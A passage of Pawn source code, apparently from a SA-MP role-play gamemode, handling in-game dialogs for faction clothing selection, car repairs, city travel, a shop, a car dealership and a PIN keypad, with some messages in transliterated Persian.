                    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[47][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[47][0]; }
                    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[44][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[44][0]; }

                }
                case 10: //Taxi Cab Company
                {
                    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[49][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[49][0]; }
                    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[50][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[50][0]; }
                    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[51][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[51][0]; }
                    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[52][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[52][0]; }
                    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[48][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[48][0]; }
                }
                case 11: //Driving/Flying School
                {
                    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[54][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[54][0]; }
                    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[55][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[55][0]; }
                    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[56][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[56][0]; }
                    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[53][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[53][0]; }
                }
                case 12: //Dangerous Tigers Family
                {
                    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[58][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[58][0]; }
                    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[59][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[59][0]; }
                    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[60][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[60][0]; }
                    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[61][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[61][0]; }
                    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[62][0]); SelectCharPlace[playerid] = 6; ChosenSkin[playerid] = JoinPed[62][0]; }
                    else if(SelectCharPlace[playerid] == 6) { SetPlayerSkin(playerid, JoinPed[63][0]); SelectCharPlace[playerid] = 7; ChosenSkin[playerid] = JoinPed[63][0]; }
                    else if(SelectCharPlace[playerid] == 7) { SetPlayerSkin(playerid, JoinPed[64][0]); SelectCharPlace[playerid] = 8; ChosenSkin[playerid] = JoinPed[64][0]; }
                    else if(SelectCharPlace[playerid] == 8) { SetPlayerSkin(playerid, JoinPed[57][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[57][0]; }
                }
                case 13: //LegendaryMen Family
                {
                    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[66][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[66][0]; }
                    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[67][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[67][0]; }
                    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[68][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[68][0]; }
                    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[69][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[69][0]; }
                    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[70][0]); SelectCharPlace[playerid] = 6; ChosenSkin[playerid] = JoinPed[70][0]; }
                    else if(SelectCharPlace[playerid] == 6) { SetPlayerSkin(playerid, JoinPed[71][0]); SelectCharPlace[playerid] = 7; ChosenSkin[playerid] = JoinPed[71][0]; }
                    else if(SelectCharPlace[playerid] == 7) { SetPlayerSkin(playerid, JoinPed[65][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[65][0]; }
                }
                case 14: //Paterno Family
                {
                    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[73][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[73][0]; }
                    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[74][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[74][0]; }
                    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[75][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[75][0]; }
                    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[76][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[76][0]; }
                    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[77][0]); SelectCharPlace[playerid] = 6; ChosenSkin[playerid] = JoinPed[77][0]; }
                    else if(SelectCharPlace[playerid] == 6) { SetPlayerSkin(playerid, JoinPed[72][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[72][0]; }
                }
                case 15: //StormMen
                {
                    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[79][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[79][0]; }
                    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[80][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[80][0]; }
                    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[81][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[81][0]; }
                    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[82][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[82][0]; }
                    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[83][0]); SelectCharPlace[playerid] = 6; ChosenSkin[playerid] = JoinPed[83][0]; }
                    else if(SelectCharPlace[playerid] == 6) { SetPlayerSkin(playerid, JoinPed[84][0]); SelectCharPlace[playerid] = 7; ChosenSkin[playerid] = JoinPed[84][0]; }
                    else if(SelectCharPlace[playerid] == 7) { SetPlayerSkin(playerid, JoinPed[78][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[78][0]; }
                                }
                case 16: //TCC
                {
                    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[86][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[86][0]; }
                    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[87][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[87][0]; }
                    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[88][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[88][0]; }
                    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[85][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[85][0]; }
                }
                }
                ShowPlayerDialog(playerid, 427, DIALOG_STYLE_MSGBOX,"Chlothes:", "Press 'Next' to select the clothes.\nPress 'Done' once you have chosen the clothes.","Next", "Done");
                return 1;
            }
            PlayerInfo[playerid][fSkin] = ChosenSkin[playerid];
            SaveKonVal(playerid, "fSkin", ChosenSkin[playerid]);
            ResetPlayerTofang(playerid);
            SetSpawnKol(playerid);
            SpawnPlayer(playerid);
            return 1;
        }
        if(dialogid == 401)
        {
            if(response)
            {
                if(PlayerInfo[playerid][pCar] != 0)
                {
                    if(GetPlayerVehicleID(playerid) == PlayerInfo[playerid][pCar])
                    {
                            if(GetPlayerPool(playerid) >= 250)
                            {
                                GivePlayerPool(playerid, -250);
                             //SaveAccount(playerid);
                            }
                            else
                            SCM(playerid, COLOR_RED, "Shoma Pool Kafi Nadarid.");
                            PlayerPlaySound(playerid, 1055, 0.0, 0.0, 10.0)
                            RemovePlayerFromVehicle(playerid);
                            return 1;
                    }
                    else
                    SCM(playerid, COLOR_RED, "This isn't your car.");
                    RemovePlayerFromVehicle(playerid);
                    return 1;
                }
            }
            else
            {
                RemovePlayerFromVehicle(playerid);
            }
        }
        if(dialogid == 403)
        {
            if(response)
            {
                if(PlayerInfo[playerid][pCar] != 0)
                {
                    new carid = GetPlayerVehicleID(playerid);
                    if(GetPlayerVehicleID(playerid) == PlayerInfo[playerid][pCar])
                    {
                        if (PlayerInfo[MashinOwner[carid]][cDestroyed] >= 1 && PlayerInfo[MashinOwner[carid]][cFixed] != 1)
                        {
                        new pricee = (PlayerInfo[MashinOwner[carid]][cPrice]*1/100);
                            if(GetPlayerPool(playerid) >= pricee)
                            {
                            PlayerInfo[MashinOwner[carid]][cFixed] = 1;
                            SaveKonVal(MashinOwner[carid], "cFixed", 1);
                                GivePlayerPool(playerid, - pricee);
                                SCM(playerid, COLOR_CRS3, "With mechanical help you manage to fix your car completely.");
                                PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0)
                                //SaveAccount(MashinOwner[carid]);
                                return 1;
                            }
                            else
                            SCM(playerid, COLOR_RED, "Shoma Pool Kafi Nadarid.");
                            PlayerPlaySound(playerid, 1055, 0.0, 0.0, 10.0)
                            RemovePlayerFromVehicle(playerid);
                            return 1;
                        }
                    }
                    else
                    SCM(playerid, COLOR_RED, "This isn't your car.");
                    RemovePlayerFromVehicle(playerid);
                    return 1;
                }
            }
            else
            {
                RemovePlayerFromVehicle(playerid);
                SCM(playerid, COLOR_RED, "You can not drive the car until you pay for the repair.");
                return 1;
            }
        }
        if(dialogid == 203010)
        {
            if(response)
            {
                if(listitem == 0)
                {
				 if(GetPlayerPool(playerid) < 1000)
                {
			SendClientMessage(playerid, COLOR_GRAD5, "Shoma Pool Kafi Nadarid (1000$)");
                        return 1;
                        }
			GivePlayerPool(playerid,-1000);
			GameTextForPlayer(playerid, "~r~-$1000", 5000, 1);
            SetPlayerInterior(playerid,1);
			SetPlayerPosEx(playerid,1.730883,28.791385,1199.593750);
            SetPlayerFacingAngle(playerid, 0.939619);
            SCM(playerid, COLOR_CRS1, "Please Wait 30 second ...");
			SetTimerEx("LStoLV",30000,false,"d",playerid);
                }
            if(listitem == 1)
                {
				 if(GetPlayerPool(playerid) < 2000)
                {
			SendClientMessage(playerid, COLOR_GRAD5, "Shoma Pool Kafi Nadarid (2000$)");
                        return 1;
                        }
			GivePlayerPool(playerid,-2000);
			GameTextForPlayer(playerid, "~r~-$2000", 5000, 1);
            SetPlayerInterior(playerid,1);
			SetPlayerPosEx(playerid,1.730883,28.791385,1199.593750);
            SetPlayerFacingAngle(playerid, 0.939619);
            SCM(playerid, COLOR_CRS1, "Please Wait 30 second ...");
			SetTimerEx("LStoSF",30000,false,"d",playerid);
                }

            }
        }
        if(dialogid == 203020)
        {
            if(response)
            {
                if(listitem == 0)
                {
				 if(GetPlayerPool(playerid) < 1000)
                {
			SendClientMessage(playerid, COLOR_GRAD5, "Shoma Pool Kafi Nadarid (1000$)");
                        return 1;
                        }
			GivePlayerPool(playerid,-1000);
			GameTextForPlayer(playerid, "~r~-$1000", 5000, 1);
            SetPlayerInterior(playerid,1);
			SetPlayerPosEx(playerid,1.730883,28.791385,1199.593750);
            SetPlayerFacingAngle(playerid, 0.939619);
            SCM(playerid, COLOR_CRS1, "Please Wait 30 second ...");
			SetTimerEx("LVtoLS",30000,false,"d",playerid);
                }
            if(listitem == 1)
                {
				 if(GetPlayerPool(playerid) < 2000)
                {
			SendClientMessage(playerid, COLOR_GRAD5, "Shoma Pool Kafi Nadarid (2000$)");
                        return 1;
                        }
			GivePlayerPool(playerid,-2000);
			GameTextForPlayer(playerid, "~r~-$2000", 5000, 1);
            SetPlayerInterior(playerid,1);
			SetPlayerPosEx(playerid,1.730883,28.791385,1199.593750);
            SetPlayerFacingAngle(playerid, 0.939619);
            SCM(playerid, COLOR_CRS1, "Please Wait 30 second ...");
			SetTimerEx("LVtoSF",30000,false,"d",playerid);
                }

            }
        }
        if(dialogid == 203030)
        {
            if(response)
            {
                if(listitem == 0)
                {
				 if(GetPlayerPool(playerid) < 1000)
                {
			SendClientMessage(playerid, COLOR_GRAD5, "Shoma Pool Kafi Nadarid (1000$)");
                        return 1;
                        }
			GivePlayerPool(playerid,-1000);
			GameTextForPlayer(playerid, "~r~-$1000", 5000, 1);
            SetPlayerInterior(playerid,1);
			SetPlayerPosEx(playerid,1.730883,28.791385,1199.593750);
            SetPlayerFacingAngle(playerid, 0.939619);
            SCM(playerid, COLOR_CRS1, "Please Wait 30 second ...");
			SetTimerEx("SFtoLV",30000,false,"d",playerid);
                }
            if(listitem == 1)
                {
				 if(GetPlayerPool(playerid) < 2000)
                {
			SendClientMessage(playerid, COLOR_GRAD5, "Shoma Pool Kafi Nadarid (2000$)");
                        return 1;
                        }
			GivePlayerPool(playerid,-2000);
			GameTextForPlayer(playerid, "~r~-$2000", 5000, 1);
            SetPlayerInterior(playerid,1);
			SetPlayerPosEx(playerid,1.730883,28.791385,1199.593750);
            SetPlayerFacingAngle(playerid, 0.939619);
            SCM(playerid, COLOR_CRS1, "Please Wait 30 second ...");
			SetTimerEx("SFtoLS",30000,false,"d",playerid);
                }

            }
        }
        if(dialogid == 404)
        {
            if(response)
            {
                if(PlayerInfo[playerid][pCar_2] != 0)
                {
                    new carid = GetPlayerVehicleID(playerid);
                    if(GetPlayerVehicleID(playerid) == PlayerInfo[playerid][pCar_2])
                    {
                        if (PlayerInfo[MashinOwner_2[carid]][cDestroyed_2] >= 1 && PlayerInfo[MashinOwner_2[carid]][cFixed_2] != 1)
                        {
                            new pricee = (PlayerInfo[MashinOwner_2[carid]][cPrice_2]*1/100);
                            if(GetPlayerPool(playerid) >= pricee)
                            {
                                PlayerInfo[MashinOwner_2[carid]][cFixed_2] = 1;
                                SaveKonVal(MashinOwner_2[carid], "cFixed_2", 1);
                                GivePlayerPool(playerid, - pricee);
                                SCM(playerid, COLOR_CRS3, "With mechanical help you manage to fix your car completely.");
                                PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0)
                                //SaveAccount(MashinOwner_2[carid]);
                                return 1;
                            }
                            else
                            {
                                SCM(playerid, COLOR_RED, "Shoma Pool Kafi Nadarid.");
                                PlayerPlaySound(playerid, 1055, 0.0, 0.0, 10.0)
                                RemovePlayerFromVehicle(playerid);
                                return 1;
                            }
                        }
                    }
                    else
                    {
                        SCM(playerid, COLOR_RED, "This isn't your car.");
                        RemovePlayerFromVehicle(playerid);
                        return 1;
                    }
                }
            }
            else
            {
                RemovePlayerFromVehicle(playerid);
                SCM(playerid, COLOR_RED, "You can not drive the car until you pay for the repair.");
                return 1;
            }
        }
        if(dialogid == 259)
        {
            if(response)
            {
                if(listitem == 0)
                {
                    if(GetPlayerPool(playerid) < 50) return SCM(playerid,COLOR_LIGHTRED,"You haven't cash for that.");
                    if(PlayerInfo[playerid][pPnumber] != 0) return SCM(playerid,COLOR_LIGHTRED,"You have cellphone.");
                    new payout = 50;
                    format(string, sizeof(string), "~r~-$%d", payout);
                    GameTextForPlayer(playerid, string, 5000, 1);
                    GivePlayerPool(playerid,- payout);
                    BizzInfo[TooBiz[playerid]][bTill] += payout;
                    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                    new rand = RandomShomare(1000000,9999999);
                    SetPlayerNumber(playerid,INVALID_PLAYER_ID,rand);
                    format(string, sizeof(string), "** Mobile Phone Purchased your new Number is %s",FormatPhoneNumber(rand));
                    SendClientMessage(playerid, COLOR_GRAD4, string);
                    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0)
                    SendClientMessage(playerid, COLOR_GRAD5, "You can check this anytime by Typing /stats");
                    SendClientMessage(playerid, COL_SYN, "Syntax: You can now type /help to see your cell phone commands.");
                }
                if(listitem == 1)
                {
                if(GetPlayerPool(playerid) < 5)
                {
                SCM(playerid,COLOR_LIGHTRED,"You haven't cash for that.");
                return 1;
                }
                        new payout = 5;
                        GivePlayerPool(playerid,- payout);
                        BizzInfo[TooBiz[playerid]][bTill] += payout;
                        format(string, sizeof(string), "~r~-$%d", payout);
                        GameTextForPlayer(playerid, string, 5000, 1);
                    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                    new prize;
                    new symb1[32]; new symb2[32]; new symb3[32];
                    new randcard1 = random(10);//minimum 1000  max 9999
                    new randcard2 = random(10);//minimum 1000  max 9999
                    new randcard3 = random(10);//minimum 1000  max 9999
                    if(randcard1 >= 5)
                    {
                        format(symb1, sizeof(symb1), "~b~]");
                        randcard1 = 1;
                    }
                    else if(randcard1 <= 4 && randcard1 >= 2)
                    {
                        format(symb1, sizeof(symb1), "~g~]");
                        randcard1 = 2;
                    }
                    else if(randcard1 < 2)
                    {
                        format(symb1, sizeof(symb1), "~y~]");
                        randcard1 = 3;
                    }
                    if(randcard2 >= 5)
                    {
                        format(symb2, sizeof(symb2), "~b~]");
                        randcard2 = 1;
                    }
                    else if(randcard2 <= 4 && randcard2 >= 2)
                    {
                        format(symb2, sizeof(symb2), "~g~]");
                        randcard2 = 2;
                    }
                    else if(randcard2 < 2)
                    {
                        format(symb2, sizeof(symb2), "~y~]");
                        randcard2 = 3;
                    }
                    if(randcard3 >= 5)
                    {
                        format(symb3, sizeof(symb3), "~b~]");
                        randcard3 = 1;
                    }
                    else if(randcard3 <= 4 && randcard3 >= 2)
                    {
                        format(symb3, sizeof(symb3), "~g~]");
                        randcard3 = 2;
                    }
                    else if(randcard3 < 2)
                    {
                        format(symb3, sizeof(symb3), "~y~]");
                        randcard3 = 3;
                    }
                    if(randcard1 == randcard2 && randcard1 == randcard3)
                    {
                        if(randcard1 > 5)
                        {
                            prize = 4;
                        }
                        if(randcard1 <= 4 && randcard1 >= 2)
                        {
                            prize = 3;
                        }
                        if(randcard1 < 2)
                        {
                            prize = 2;
                        }
                        GivePlayerPool(playerid,prize);
                        BizzInfo[TooBiz[playerid]][bTill] -= prize;
                        PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0)
                        format(string, sizeof(string), "%s %s %s ~n~~n~~w~~g~$%d",symb1,symb2,symb3, prize);
                    }
                    else
                    {
                        format(string, sizeof(string), "%s %s %s ~n~~n~~w~~r~$0",symb1,symb2,symb3);
                    }
                    GameTextForPlayer(playerid, string, 3000, 3);
                    return 1;
                }
				if(listitem == 2)
				{
					new payout = 1;
					if(GetPlayerPool(playerid) < payout) return SCM(playerid,COLOR_LIGHTRED,"You haven't cash for that.");
					GivePlayerPool(playerid,- payout);
					BizzInfo[TooBiz[playerid]][bTill] += payout;
					GameTextForPlayer(playerid, "~r~-$1", 5000, 1);
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					PlayerInfo[playerid][pPhoneBook] = 1;
					SaveKonVal(playerid, "pPhoneBook", 1);
					PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0)
					format(string, sizeof(string), "** Phone Book Purchased you can look up any Players Number !");
					SendClientMessage(playerid, COLOR_GRAD4, string);
					SendClientMessage(playerid, COL_SYN, "1. Syntax: /number <PlayerID/PartOfName> | 2. Press TAB and Double Click on Player Name.");
					return 1;
				}
                if(listitem == 3)
                {
                if(GetPlayerPool(playerid) < 1)
                {
                SCM(playerid,COLOR_LIGHTRED,"You haven't cash for that.");
                return 1;
                }
                        new payout = 1;
                        GivePlayerPool(playerid,- payout);
                        BizzInfo[TooBiz[playerid]][bTill] += payout;
                        format(string, sizeof(string), "~r~-$%d", payout);
                        GameTextForPlayer(playerid, string, 5000, 1);
                    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                    gDice[playerid] = 1;
                    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0)
                    format(string, sizeof(string), "** Dice Purchased you can throw your Dice.");
                    SendClientMessage(playerid, COLOR_GRAD4, string);
                    SendClientMessage(playerid, COL_SYN, "Syntax: /dice");
                    return 1;
                }
                if(listitem == 4)
                {
                if(GetPlayerPool(playerid) < 75)
                {
                SCM(playerid,COLOR_LIGHTRED,"You haven't cash for that.");
                return 1;
                }
                    PlayerInfo[playerid][pCanistra] = 20;
                    SaveKonVal(playerid, "pCanistra", 20);
                    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                    GivePlayerPool(playerid, -75);
                    BizzInfo[TooBiz[playerid]][bTill] += 75;
                    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0)
                    SendClientMessage(playerid, COL_SYN, "Syntax: /fillcar");
                    GameTextForPlayer(playerid, "~r~-$75", 5000, 1);
                    return 1;
                }

                if(listitem == 5)
                {
                if(GetPlayerPool(playerid) < 25)
                {
                SCM(playerid,COLOR_LIGHTRED,"You haven't cash for that.");
                return 1;
                }
                    GivePlayerPool(playerid, - 25);
                    format(string, sizeof(string), "~r~-$%d", 25);
                    GameTextForPlayer(playerid, string, 5000, 1);
                    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                    BizzInfo[TooBiz[playerid]][bTill] += 25;
                    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0)
                    format(string, sizeof(string), "Camera Purchased.");
                    SendClientMessage(playerid, COLOR_GRAD4, string);
                    GivePlayerTofang(playerid, 43, 20);
                    return 1;
                }
                if(listitem == 6)
                {
                if(GetPlayerPool(playerid) < 1)
                {
                SCM(playerid,COLOR_LIGHTRED,"You haven't cash for that.");
                return 1;
                }
                    if(PlayerInfo[playerid][pLighter] != 0)
                    {
                         SendClientMessage(playerid, COLOR_GREY, "** You already have a lighter ! ");
                         return 1;
                    }
                    GivePlayerPool(playerid, - 1);
                    PlayerInfo[playerid][pLighter] = 30;
                    SaveKonVal(playerid, "pLighter", 30);
                    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                    BizzInfo[TooBiz[playerid]][bTill] += 1;
                    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0)
                    format(string, sizeof(string), "~r~-$%d", 1);
                    GameTextForPlayer(playerid, string, 5000, 1);
                    SendClientMessage(playerid, COLOR_GRAD4, "** Lighter Purchased.");
                    //SaveAccount(playerid);
                    return 1;
                }
                if(listitem == 7)
                {
                if(GetPlayerPool(playerid) < 1)
                {
                SCM(playerid,COLOR_LIGHTRED,"You haven't cash for that.");
                return 1;
                }
                    if(PlayerInfo[playerid][pCigarettes] != 0)
                    {
                        format(string, sizeof(string), "** You already have %d cigarettes left .", PlayerInfo[playerid][pCigarettes]);
                        SendClientMessage(playerid, COLOR_GREY, string);
                        return 1;
                    }
                    GivePlayerPool(playerid, - 1);
                    PlayerInfo[playerid][pCigarettes] = 20;
                    SaveKonVal(playerid, "pCigarettes", 20);
                    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                    format(string, sizeof(string), "~r~-$1");
                    BizzInfo[TooBiz[playerid]][bTill] += 1;
                    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0)
                    GameTextForPlayer(playerid, string, 5000, 1);
                    SendClientMessage(playerid, COLOR_GRAD4, "Cigarettes Purchased.");
                    SendClientMessage(playerid, COL_SYN, "HINT: You can /smoke now");
                    //SaveAccount(playerid);
                }
                if(listitem == 8)
                {
                if(GetPlayerPool(playerid) < 5)
                {
                SCM(playerid,COLOR_LIGHTRED,"You haven't cash for that.");
                return 1;
                }
                    PINFO[playerid][pWalkieTalkie] = 1;
                    SaveKonVal(playerid, "pWalkieTalkie", 1);
                    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                    GivePlayerPool(playerid, -5);
                    BizzInfo[TooBiz[playerid]][bTill] += 5;
                    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0)
                    SendClientMessage(playerid, COL_SYN, "Syntax: /wthelp");
                    GameTextForPlayer(playerid, "~r~-$5", 5000, 1);
                    return 1;
                }
        }
    }
    return 1;
}
public OnPlayerClickTextDraw(playerid, Text:clickedid)
{


	if(clickedid == BuyModel[playerid]) {
	if(GetPlayerPool(playerid) < PriceCar[playerid]) return SCM(playerid, COLOR_YELLOW2, "Error: Shoma Pool Kafi Baraye Kharid In Mashin Ro Nadarid ;(")


new vehicless = GetVehicleModel(vhid[playerid]) - 400;
new x[512];
format(x, sizeof(x), "Shoma Motmaeen Hastid Baraye Kharide {57e547}%s {FFFFFF}Ba Gheymate {57e547}%s$ ?",aVehicleNames[vehicless],FormatNumber(PriceCar[playerid]));
ShowPlayerDialog(playerid, 2066, DIALOG_STYLE_MSGBOX,"Dealership",x,"Yes","Cancel");
	}
	if(clickedid == TestModel[playerid]) // We found the number they clicked.
	{
	SetVehiclePos(vhid[playerid], 346.314880,-1519.462158,32.913539);
	SetVehicleZAngle(vhid[playerid], 249.463790);
	SCM(playerid, COLOR_YELLOW, "Shoma 3 Daghighe Time Darid Ta Mashin Ra Test Konid.");
	TextDrawHideForPlayer(playerid, TestModel[playerid]);
	TextDrawHideForPlayer(playerid, BuyModel[playerid]);
	TextDrawHideForPlayer(playerid, NextModel[playerid]);
	TextDrawHideForPlayer(playerid, PrevModel[playerid]);
	TextDrawHideForPlayer(playerid, ExitDS[playerid]);
	TextDrawHideForPlayer(playerid, RotModel[playerid]);
	TextDrawHideForPlayer(playerid, RotModel2[playerid]);
	PlayerTextDrawHide(playerid, CarModel[playerid]);
	PlayerTextDrawHide(playerid, PriceModel[playerid]);
	OnMashinKharidan[playerid] = 0;
	SetPlayerPos(playerid, 325.5731,-1514.8918,36.0325);
	CancelSelectTextDraw(playerid);
	SetCameraBehindPlayer(playerid);
	PutPlayerInVehicle(playerid, vhid[playerid], 0);
	SetTimerEx("OnTestMashinOk", 2000, 0, "i", playerid);
	LockEngine[vhid[playerid]] = false;
	}
	if(clickedid == PrevModel[playerid]) // We found the number they clicked.
	{
		DestroyVehicle(vhid[playerid]);
		if(rV[playerid] == 1) {
		rV[playerid] = 98;
		}
		else {
		rV[playerid] -= 1;
		}
		okkon(playerid,rV[playerid]);
	}
	if(clickedid == NextModel[playerid]) // We found the number they clicked.
	{
	DestroyVehicle(vhid[playerid]);
		if(rV[playerid] == 98) {
		rV[playerid] = 1;
		}
		else {
		rV[playerid] += 1;
		}
		okkon(playerid,rV[playerid]);
	}
if(clickedid == ExitDS[playerid]) {
		DestroyVehicle(vhid[playerid]);
		TextDrawHideForPlayer(playerid, TestModel[playerid]);
		TextDrawHideForPlayer(playerid, BuyModel[playerid]);
		TextDrawHideForPlayer(playerid, NextModel[playerid]);
		TextDrawHideForPlayer(playerid, PrevModel[playerid]);
		TextDrawHideForPlayer(playerid, ExitDS[playerid]);
		TextDrawHideForPlayer(playerid, RotModel[playerid]);
		TextDrawHideForPlayer(playerid, RotModel2[playerid]);
		PlayerTextDrawHide(playerid, CarModel[playerid]);
		PlayerTextDrawHide(playerid, PriceModel[playerid]);
		OnMashinKharidan[playerid] = 0;
		SetPlayerPos(playerid, 325.5731,-1514.8918,36.0325);
		CancelSelectTextDraw(playerid);
		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid, 0);
}
	if(clickedid == RotModel[playerid]) // We found the number they clicked.
	{
		if(roV[playerid] == 7) {
		roV[playerid] = 0;
		}
		else {roV[playerid] += 1;}
		ChangeRot(playerid,roV[playerid]);

	}
	if(clickedid == RotModel2[playerid]) // We found the number they clicked.
	{
		if(roV[playerid] == 0) {
		roV[playerid] = 7;
		}
		else {roV[playerid] -= 1;}
		ChangeRot(playerid,roV[playerid]);

	}


	if(clickedid == TDPinCode[playerid][1] && strlen(PlayerRamz[playerid]) != 4)
	{
		format(PlayerRamz[playerid],5,"%s1",PlayerRamz[playerid]);
		TextDrawSetString(TDPinCode[playerid][23],PlayerRamz[playerid]);
	}
	if(clickedid == TDPinCode[playerid][4] && strlen(PlayerRamz[playerid]) != 4)
	{
		format(PlayerRamz[playerid],5,"%s2",PlayerRamz[playerid]);
		TextDrawSetString(TDPinCode[playerid][23],PlayerRamz[playerid]);
	}
	if(clickedid == TDPinCode[playerid][5] && strlen(PlayerRamz[playerid]) != 4)
	{
		format(PlayerRamz[playerid],5,"%s3",PlayerRamz[playerid]);
		TextDrawSetString(TDPinCode[playerid][23],PlayerRamz[playerid]);
	}
	if(clickedid == TDPinCode[playerid][12] && strlen(PlayerRamz[playerid]) != 4)
	{
		format(PlayerRamz[playerid],5,"%s4",PlayerRamz[playerid]);
		TextDrawSetString(TDPinCode[playerid][23],PlayerRamz[playerid]);
	}
	if(clickedid == TDPinCode[playerid][13] && strlen(PlayerRamz[playerid]) != 4)
	{
		format(PlayerRamz[playerid],5,"%s5",PlayerRamz[playerid]);
		TextDrawSetString(TDPinCode[playerid][23],PlayerRamz[playerid]);
	}
	if(clickedid == TDPinCode[playerid][14] && strlen(PlayerRamz[playerid]) != 4)
	{
